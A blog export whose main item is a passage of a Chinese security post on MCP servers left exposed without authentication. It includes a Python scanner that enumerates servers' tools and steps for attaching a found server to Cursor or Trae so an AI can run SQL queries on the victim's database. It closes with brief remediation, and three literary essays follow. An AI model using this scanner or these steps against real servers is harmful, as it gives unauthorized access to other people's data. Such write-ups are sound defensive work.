class="hljs-comment"># 如果文件已存在，读取现有数据并添加新数据</span><br>        existing_data = []<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> os.path.exists(output_file):<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                    existing_data = json.load(f)<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(existing_data, <span class="hljs-built_in">list</span>):<br>                    existing_data = [existing_data]<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;读取现有JSON文件时出错: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>            existing_data = []<br>        <br>        <span class="hljs-comment"># 添加新数据并保存</span><br>        existing_data.append(data_to_save)<br>        <br>        <span class="hljs-comment"># 使用临时文件保存，成功后再重命名，避免写入失败导致文件损坏</span><br>        temp_file = output_file + <span class="hljs-string">&#x27;.tmp&#x27;</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(temp_file, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            json.dump(existing_data, f, ensure_ascii=<span class="hljs-literal">False</span>, indent=<span class="hljs-number">2</span>, default=<span class="hljs-built_in">str</span>)<br>        <br>        <span class="hljs-comment"># 重命名临时文件为目标文件</span><br>        os.replace(temp_file, output_file)<br>        <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;成功将URL和工具信息保存到 <span class="hljs-subst">&#123;output_file&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;保存工具信息时出错: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">import</span> traceback<br>        traceback.print_exc()<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">connect_server</span>(<span class="hljs-params">base_url, timeout=<span class="hljs-number">10</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    连接到 MCP 服务器并获取工具列表</span><br><span class="hljs-string"></span><br><span class="hljs-string">    参数:</span><br><span class="hljs-string">        base_url: 服务器URL</span><br><span class="hljs-string">        timeout: 连接超时时间（秒）</span><br><span class="hljs-string"></span><br><span class="hljs-string">    返回:</span><br><span class="hljs-string">        包含以下键的字典:</span><br><span class="hljs-string">        - session: ClientSession 对象</span><br><span class="hljs-string">        - tools: 工具字典 &#123;name: tool&#125;</span><br><span class="hljs-string">        - exit_stack: ExitStack 对象用于资源管理</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    url = base_url<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;尝试连接到: <span class="hljs-subst">&#123;url&#125;</span>&quot;</span>)<br><br>    exit_stack = AsyncExitStack()<br>    result = &#123;<br>        <span class="hljs-string">&#x27;exit_stack&#x27;</span>: exit_stack,<br>    &#125;<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 使用asyncio.wait_for添加超时处理</span><br>        <span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">connect</span>():<br>            <span class="hljs-comment"># 建立 SSE 连接</span><br>            sse_cm = sse_client(url)<br>            streams = <span class="hljs-keyword">await</span> exit_stack.enter_async_context(sse_cm)<br><br>            <span class="hljs-comment"># 创建会话</span><br>            session_cm = ClientSession(streams[<span class="hljs-number">0</span>], streams[<span class="hljs-number">1</span>])<br>            session = <span class="hljs-keyword">await</span> exit_stack.enter_async_context(session_cm)<br>            <span class="hljs-keyword">await</span> session.initialize()<br>            <span class="hljs-keyword">return</span> session, streams<br>        <br>        <span class="hljs-comment"># 添加超时处理</span><br>        session, streams = <span class="hljs-keyword">await</span> asyncio.wait_for(connect(), timeout=timeout)<br><br>        <span class="hljs-comment"># 获取工具列表</span><br>        response = <span class="hljs-keyword">await</span> session.list_tools()<br>        tools = &#123;tool.name: tool <span class="hljs-keyword">for</span> tool <span class="hljs-keyword">in</span> response.tools&#125;<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;成功获取 <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(tools)&#125;</span> 个工具:&quot;</span>)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tools:<br>            <span class="hljs-built_in">print</span>(i,tools[i].description.replace(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;\r&quot;</span>,<span class="hljs-string">&quot;&quot;</span>))<br><br>        result[<span class="hljs-string">&#x27;session&#x27;</span>] = session<br>        result[<span class="hljs-string">&#x27;tools&#x27;</span>] = tools<br>        <span class="hljs-keyword">return</span> result<br><br>    <span class="hljs-keyword">except</span> asyncio.TimeoutError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;连接超时: <span class="hljs-subst">&#123;url&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">await</span> exit_stack.aclose()<br>        <span class="hljs-keyword">raise</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;连接失败: <span class="hljs-subst">&#123;url&#125;</span>, 错误: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">await</span> exit_stack.aclose()<br>        <span class="hljs-keyword">raise</span><br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    主函数：从CSV文件中提取URL，连接服务器获取工具信息，并保存到JSON文件</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 去重并打印URL数量</span><br>    unique_urls = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">set</span>(urls))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;从CSV文件中提取了 <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(urls)&#125;</span> 个URL，去重后剩余 <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(unique_urls)&#125;</span> 个&quot;</span>)<br>    <br>    <span class="hljs-comment"># 记录各种状态的URL数量</span><br>    success_count = <span class="hljs-number">0</span>  <span class="hljs-comment"># 成功连接的URL数量</span><br>    saved_count = <span class="hljs-number">0</span>    <span class="hljs-comment"># 成功保存工具信息的URL数量</span><br>    timeout_count = <span class="hljs-number">0</span>  <span class="hljs-comment"># 连接超时的URL数量</span><br>    error_count = <span class="hljs-number">0</span>    <span class="hljs-comment"># 其他错误的URL数量</span><br>    <br>    <span class="hljs-comment"># 创建输出目录（如果不存在）</span><br>    output_dir = <span class="hljs-string">&#x27;tools_data&#x27;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(output_dir):<br>        os.makedirs(output_dir)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;创建输出目录: <span class="hljs-subst">&#123;output_dir&#125;</span>&quot;</span>)<br>    <br>    <span class="hljs-comment"># 创建带有时间戳的输出文件名</span><br>    timestamp = datetime.datetime.now().strftime(<span class="hljs-string">&#x27;%Y%m%d_%H%M%S&#x27;</span>)<br>    output_file = os.path.join(output_dir, <span class="hljs-string">f&#x27;tools_info_<span class="hljs-subst">&#123;timestamp&#125;</span>.json&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;工具信息将保存到: <span class="hljs-subst">&#123;output_file&#125;</span>&quot;</span>)<br>    <br>    <span class="hljs-comment"># 遍历所有URL</span><br>    <span class="hljs-keyword">for</span> i, url <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(unique_urls):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n[<span class="hljs-subst">&#123;i+<span class="hljs-number">1</span>&#125;</span>/<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(unique_urls)&#125;</span>] 正在尝试连接: <span class="hljs-subst">&#123;url&#125;</span>&quot;</span>)<br>        base_url = url<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> base_url.endswith(<span class="hljs-string">&#x27;/sse&#x27;</span>):<br>            base_url += <span class="hljs-string">&quot;/sse&quot;</span><br>        <br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># 设置较短的超时时间，避免长时间等待</span><br>            result = <span class="hljs-keyword">await</span> connect_server(base_url, timeout=<span class="hljs-number">5</span>)<br>            <span class="hljs-keyword">if</span> result <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;tools&#x27;</span> <span class="hljs-keyword">in</span> result:<br>                success_count += <span class="hljs-number">1</span><br>                tools_count = <span class="hljs-built_in">len</span>(result[<span class="hljs-string">&#x27;tools&#x27;</span>])<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;成功获取 <span class="hljs-subst">&#123;tools_count&#125;</span> 个工具，尝试保存...&quot;</span>)<br>                <br>                <span class="hljs-comment"># 保存工具信息</span><br>                <span class="hljs-keyword">try</span>:<br>                    <span class="hljs-keyword">if</span> save_tools_to_json(url, result[<span class="hljs-string">&#x27;tools&#x27;</span>], output_file):<br>                        saved_count += <span class="hljs-number">1</span><br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;✅ 成功保存 <span class="hljs-subst">&#123;url&#125;</span> 的 <span class="hljs-subst">&#123;tools_count&#125;</span> 个工具信息&quot;</span>)<br>                    <span class="hljs-keyword">else</span>:<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;❌ 保存 <span class="hljs-subst">&#123;url&#125;</span> 的工具信息失败&quot;</span>)<br>                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;❌ 保存工具信息时出错: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>                    <span class="hljs-keyword">import</span> traceback<br>                    traceback.print_exc()<br>                <br>                <span class="hljs-comment"># 关闭连接</span><br>                <span class="hljs-keyword">try</span>:<br>                    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;session&#x27;</span> <span class="hljs-keyword">in</span> result:<br>                        <span class="hljs-keyword">await</span> result[<span class="hljs-string">&#x27;session&#x27;</span>].close()<br>                    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;exit_stack&#x27;</span> <span class="hljs-keyword">in</span> result:<br>                        <span class="hljs-keyword">await</span> result[<span class="hljs-string">&#x27;exit_stack&#x27;</span>].aclose()<br>                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;关闭连接时出错: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;❌ 连接成功但未获取到工具信息&quot;</span>)<br>                error_count += <span class="hljs-number">1</span><br>                <br>        <span class="hljs-keyword">except</span> asyncio.TimeoutError:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;⏱️ 连接超时: <span class="hljs-subst">&#123;base_url&#125;</span>&quot;</span>)<br>            timeout_count += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;❌ 连接失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>            error_count += <span class="hljs-number">1</span><br>    <br>    <span class="hljs-comment"># 打印总结信息</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n===== 扫描完成 =====&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;总共尝试连接: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(unique_urls)&#125;</span> 个URL&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;成功连接并获取工具: <span class="hljs-subst">&#123;success_count&#125;</span> 个&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;成功保存工具信息: <span class="hljs-subst">&#123;saved_count&#125;</span> 个&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;连接超时: <span class="hljs-subst">&#123;timeout_count&#125;</span> 个&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;其他错误: <span class="hljs-subst">&#123;error_count&#125;</span> 个&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;工具信息已保存到: <span class="hljs-subst">&#123;output_file&#125;</span>&quot;</span>)<br>    <br>    <span class="hljs-comment"># 如果没有成功保存任何工具信息，检查输出文件是否存在</span><br>    <span class="hljs-keyword">if</span> saved_count == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">if</span> os.path.exists(output_file):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;警告: 输出文件存在但未记录成功保存，请检查文件内容&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;警告: 未成功保存任何工具信息，输出文件不存在&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    asyncio.run(main())<br></code></pre></td></tr></table></figure><p>部分结果如下，ip地址</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-07-27%20at%2001.58.53@2x.png"></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-07-27%20at%2002.00.13@2x.png"></p><p>写到这里各位大概也已经初步了解此类漏洞该去如何利用了，以此延伸出来的漏洞有RCE、数据泄露、SSRF等漏洞，最简单的漏洞应该就是信息泄露，直接调用mcp去查询即可未授权获取受害者服务器信息</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">execute_mysql_query     执行给定的 <span class="hljs-keyword">SQL</span> 查询语句并返回结果或错误信息。    Args:        sql_query (str): 由 LLM 生成的 <span class="hljs-keyword">SQL</span> 查询语句。        max_rows (<span class="hljs-type">int</span>): 对于 <span class="hljs-keyword">SELECT</span> 查询，限制返回的最大行数，防止结果过大。    <span class="hljs-keyword">Returns</span>:        str: 格式化后的查询结果字符串或错误信息字符串。             对于 <span class="hljs-keyword">SELECT</span>，返回表头和数据行。             对于 <span class="hljs-keyword">INSERT</span>/<span class="hljs-keyword">UPDATE</span>/<span class="hljs-keyword">DELETE</span>，返回影响的行数。             对于错误，返回具体的错误信息。    <br>list_tables     获取当前数据库中所有表的列表。    内部调用 execute_mysql_query 执行 <span class="hljs-string">&#x27;SHOW TABLES;&#x27;</span>。    <br>get_table_schema     获取指定数据表的结构（列信息）。    内部调用 execute_mysql_query 执行 <span class="hljs-string">&#x27;DESCRIBE table_name;&#x27;</span>。    Args:        <span class="hljs-built_in">table_name</span> (str): 需要查询结构的数据表名称。    <span class="hljs-keyword">Returns</span>:        str: 表结构的格式化字符串或错误信息。    <br>query_dify_alerts <br>query_ne_parameters     根据指定的设备名称获取设备的参数信息。    调用指定的 API 接口获取参数信息，使用 HTTP POST 请求。    Args:        StationInfoRequest (dict): 查询参数对象，包含设备名称列表    <span class="hljs-keyword">Returns</span>:        dict: 包含设备参数信息的结构化数据或错误信息。    <br></code></pre></td></tr></table></figure><p>我们根据获取到的直接去cursor或者trae中调用mcp</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;mcpServers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;test&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http://xxxxxx:xxx/sse&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-07-27%20at%2002.20.57@2x.png"></p><p>获取到了我们上面脚本跑出来的五个工具</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-07-27%20at%2002.21.19@2x.png"></p><p>然后直接ai去调用即可</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-07-27%20at%2002.27.44@2x.png"></p><p>用我自己放到公网的mcp测试如下，危害大家就一目了然了</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-07-27%20at%2002.31.33@2x.png"></p><h1 id="自查及修复"><a href="#自查及修复" class="headerlink" title="自查及修复"></a>自查及修复</h1><p>mcp服务不要放到公网上，以及如果要放到公网上设置白名单</p>]]></content>
    
    
    <categories>
      
      <category>未授权访问</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Mcp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>雪国</title>
    <link href="/2025/08/20/%E9%9B%AA%E5%9B%BD/"/>
    <url>/2025/08/20/%E9%9B%AA%E5%9B%BD/</url>
    
    <content type="html"><![CDATA[<blockquote><p>2025年8月13日（星期三） (GMT+8) 14:29<br>“穿过县界长长的隧道，列车到达雪国，夜幕笼罩下，一切都被雪染成了白色，只有一点微微的火光”<br>“银河仿佛一片巨大的极光，从自己身体的身上流淌而去，冷彻入骨的孤寂，又像是某种美艳的惊异。”</p></blockquote><p>更像是一篇未完成的手记，对于景色和环境的描写很美很美，美到我躺在床上依然脑海依然能浮现出一幕幕成精，雪，代表纯洁无暇，就像川端康成笔下的驹子一样，“纯洁无暇”，虽然是一部拿到了诺贝尔文学奖的书，但是更愿当做一部普通的爱情小说来阅读，不仅仅是因为在驹子的世界，这段经历是纯洁美好的，是她所向往的，也无关乎与“徒劳”“物哀”，而是驹子实实在在努力的过程，即使结局或许不太如意。</p><p>或许在旁人看来驹子为救治行男沦为艺妓是徒劳，写日记、练三弦是徒劳，甚至爱情亦是徒劳，甚至在岛村和叶子看来都是徒劳，就像火对于雪亦是徒劳，但驹子如“雪中火”般的炽热挣扎，恰与岛村的冷漠形成刺目对比：她以飞蛾扑火的姿态对抗命运，即便结局注定，仍以日记记录存在，以琴声叩问意义，以过程对抗结果或许更是作者想以驹子告诉读者的道理，或许在岛村看来驹子是徒劳的，或许一开始岛村就以一个有家室的男人本就只是想脱离于外面的世界来到雪国，但是对于驹子不是这样的，明知对于岛村自己是“飞蛾扑火”但是仍深夜深夜踏雪赴约，将爱情视为“雪中火”般的生存证明，或许是跟日本当时那段时间的历史有关，但是驹子是“勇敢”的。</p><p>岛村不是完整的，只是一部分进入了雪国这个“与世隔绝”的世界，就像岛村研究西洋舞蹈却只靠书籍想象，迷恋驹子却称其爱情为“徒劳”——本质上是在恐惧真实的生命热度，而驹子是生存在雪国中的一个普普通通的“艺伎”但是却是她是雪国土壤里长出的生命，“偏要在葬礼上弹琴”，一开始就注定结局惨烈。</p><p>待岛村站稳脚跟，抬头望去，银河仿佛哗地一声向心坎倾泻。</p><p><strong>待心中银河倾泻而下，即使身旁的人不是彼此了，也要将过往深深印入脑海。</strong></p>]]></content>
    
    
    <categories>
      
      <category>随笔</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>地狱变</title>
    <link href="/2025/08/20/%E5%9C%B0%E7%8B%B1%E5%8F%98/"/>
    <url>/2025/08/20/%E5%9C%B0%E7%8B%B1%E5%8F%98/</url>
    
    <content type="html"><![CDATA[<p>芥川龙之介写的小说我总感觉很“可怕”，在重看一遍还是觉得很恐怖，给我一种不寒而栗的感觉，或许跟他本人的精神状态有关，几乎每篇都会涉及鬼神、地狱等形象，就像这篇小说地狱变一样</p><p>一个孤高古怪的天才画师良秀，“天才在左疯子在右”，良秀就是这样一个“天才疯子”。为描绘地狱烈火焚车的极致景象，不惜以爱女的生命为祭，最终在完成惊世屏风后自缢身亡。</p><p>通篇以大量的篇幅奠定性格基础，从各个方面描绘出了良秀的性格，冷酷、傲慢、性格孤僻、病态的对艺术的狂热，同时也是一个艺术而燃烧灵魂的天才。他视艺术为最高价值，甚至超越生命与人伦。为了捕捉“真实”，他不惜采用极端手段：让弟子身缚锁链被怪鸟啄食来观察弟子的痛苦表情，在腐烂尸体旁写生来描绘死亡气息，甚至要求重现贵妇在烈火中焚身的景象。这种对艺术“真实感”的病态执着，是他性格中最显著也最骇人的特质。也是因为有这样恐怖的性格，才有了最后牺牲女儿来造就惊世屏风的悲剧。</p><p>我最直接感受到的良秀性格中最核心的悲剧性矛盾在于：他最深爱的女儿，最终成为了他艺术追求最高目标的牺牲品。他并未主动要求牺牲女儿，但当大公“成全”他的艺术请求，将女儿投入火海时，他作为父亲的本能与作为艺术家的本能发生了惨烈的撕裂，是我那一瞬间从芥川龙之介文字中深刻体会到的，文中写到：</p><blockquote><p>“良秀那时的脸色，我至今都不能忘记。当他茫然地向车子奔去时，忽然看到火焰升起，脚步立刻停了下来，两臂依然伸向前面，眼睛好像要把当前的最象全部吞进去似的，紧紧注视着包卷在火焰中的车子，良秀的全身映在红红的火光中，连胡子楂儿都看得清楚。睁圆的眼，因恐惧而歪斜的嘴和瑟瑟发抖的脸上的肌肉，清清楚楚地显出了他脸上的恐怖、悲哀、惊慌。即使在刑场上要被砍头的强盗，即使是拉上阎王殿的十恶不赦的强盗魂，也不会有这样吓人的颜色。”</p></blockquote><p>对于艺术的追求和对于女儿深沉的爱那一瞬间的碰撞，或许是导致良秀完成后自缢的最直接原因。良秀的自杀是其性格逻辑发展的必然结果。他毕生追求艺术极致，为此不惜一切代价，最终代价却是他最珍视的人性和亲情。当他意识到自己为了艺术竟能“欣赏”女儿惨死的景象时，我想他应该无法再与这样的自己共存，也对于自身是否还有存在于世上的必要产生了疑问。</p><p>其实又尝不是芥川龙之介对于自己的解构，同良秀一样，对于文学的近乎病态的执着，所写文字均是在展示社会现象和人性丑陋，作品无不展现了他对人性幽暗深渊的凝视，与良秀为捕捉地狱烈焰的真实感而观察猴子被折磨，直至最终目睹女儿在烈火中焚身的“艺术观察”异曲同工</p><p>堀川大公在《地狱变》中象征着绝对权力对个体包括良秀这种天才的冷酷碾压。芥川虽未直接死于权力之手，但他所身处的时代——表面民主繁荣的大正时代，内里却涌动着传统价值崩塌、社会不公加剧、军国主义抬头的暗流——同样构成了巨大的精神压迫。对所处世界的窒息感与无力感，与良秀身处大公强权之下，纵然才华绝世却无法掌控自身命运的绝望，在精神层面形成了深刻的共鸣。他们都清醒地认识到自己身处一个令人窒息的结构之中却无法自拔。</p><p>同样良秀最后的自缢，是目睹女儿惨死的精神崩溃，也是对自身在艺术狂热中暴露出的“非人性”一面的终极绝望与自我惩罚。芥川龙之介在1927年，同样以自杀的方式结束了自己35岁的生命。我想他的自杀，是长期精神苦斗的最终溃败，也是对他所看见的那个充满“利己主义”和“地狱景象”的世界的彻底放弃。良秀的地狱变屏风，以女儿的生命为颜料；芥川那些剖析人性至暗的文学创作，则是以他饱受煎熬的灵魂为笔，以他对世界深刻的绝望为纸。或许当他心中那幅描绘人性地狱的巨作完成后，他也如良秀般，无法与这个“地狱景象”的世界共存。</p>]]></content>
    
    
    <categories>
      
      <category>随笔</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>罗生门</title>
    <link href="/2025/08/20/%E7%BD%97%E7%94%9F%E9%97%A8/"/>
    <url>/2025/08/20/%E7%BD%97%E7%94%9F%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<p><strong>罗生门写于日本大正四年九月这个时期类似于国内的民国初期，也就是北洋政府时期，也就比较好理解了。</strong></p><blockquote><p>大正时代以1912年的“大正政变”（第一次护宪运动）为开端，我百度了一下相关的历史，其实刚好处于新旧交替的历史浪潮中，受到西方自由主义、民主主义、社会主义、无政府主义等思潮的强烈冲击。。民众（尤其是城市中产阶级和知识分子）的公民意识觉醒，要求扩大普选权（1925年实现男子普选）、改善劳工待遇、争取妇女权利等，同时西方思想的涌入猛烈冲击着以儒家伦理和家族制度为核心的日本传统价值观。个人主义与集体主义、自由恋爱与家族包办婚姻、新道德与旧伦理之间产生了激烈的冲突和混乱。许多人感到精神上的迷失和无所适从，旧秩序崩塌但新秩序并未建立完全，导致社会出现各种混乱，比如我翻到的1918年的“米骚动”等混乱事件</p></blockquote><p>开篇提到的破败、阴森、失去原有功能的罗生门，曾是威严、秩序、庇护的象征，如今沦为尸体堆积、盗贼横行的场所，正是大正时代传统价值在西方思潮冲击下的崩塌。看似表面上是民主、西化、繁荣的“新时代”，但旧秩序已经完全崩塌，新的、稳固的秩序尚未完全建立，社会处于一种价值真空和道德失范的混乱状态。城门下的阴暗角落，汇聚了贫困、死亡、罪恶，隐喻大正“民主繁荣”表象下被掩盖的社会不公、底层苦难与人性的阴暗，整个社会处于动荡混乱当中。</p><p>在经济萧条动荡不安的社会大环境中，仆人和老妇等普通人都面临着极端的生存困境，失业、饿死。在“饿死”还是“作恶”的选择面前，善恶观就显得苍白无力，挣扎求生的底层民众是别无选择的，也映射了大正时代底层民众在快速现代化和社会分化中的挣扎，社会快速的变动带来的底层人民的痛苦。老妇为自己的“作恶”行为辩护，仆人也以此为自己抢夺开脱（“我不抢你，我也会饿死”），这种“恶的连锁”和道德相对主义的逻辑，也揭示了在传统价值崩塌、社会压力巨大的环境下，个体如何轻易地找到借口来合理化自己的卑劣行为，放弃道德坚守，潜意识里作者或许想说的是大正时代日本知识分子对社会达尔文主义、利己主义的推崇以及作者对于这种现象蔓延的忧虑。</p><p>同时仆人最终从人变为鬼，也代指着极端环境下人性向兽性即最原始的生存本能的退化，也是芥川龙之介对大正时代盛行的物质主义、利己主义蔓延导致人性从“人变为鬼”异化的警示。</p><p>芥川龙之介文中写到的老妇拔取女尸头发制作假发谋生，原本亵渎尸体的行为，但是在极端贫困的环境中，生存需求迫使人们践踏最基本的道德底线即对死者的不尊重，更加说明在那个年代的社会动荡和混乱。同时写到的老妇用“女尸生前也作恶（卖假鱼干）”为自己辩护，用女尸生前也作恶来为自己的恶性开脱以及合理化自己的恶行，在价值混乱时代，个体如何通过指责他人的“恶”来合理化自己的卑劣行径，形成“恶”的传递与扩散，处于当时的时代背景下人们的价值观混乱以及弱肉强食的丛林法则在底层社会的赤裸呈现，现代化进程中对底层人民的残酷性。</p><p>在看的时候从一开始就感受到了小说的狂暴和压抑的氛围，不管是地震、布满天空的乌鸦、狂风暴雨，各种环境氛围代表着大正时代表面的民主浪潮下，社会矛盾、政治暗流带来的不安与窒息感，压的人喘不过来气，同时布满天空的乌鸦和黑夜更代表着黑夜遮蔽视线，模糊了善恶界限，那个时代的价值标准的混乱导致的社会普遍性道德失范与判断困难。仆人最终消失在“黑夜深处”，表明那个年代的个体乃至整个社会在剧变时代中对前路的迷茫与未知的恐惧。</p>]]></content>
    
    
    <categories>
      
      <category>随笔</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
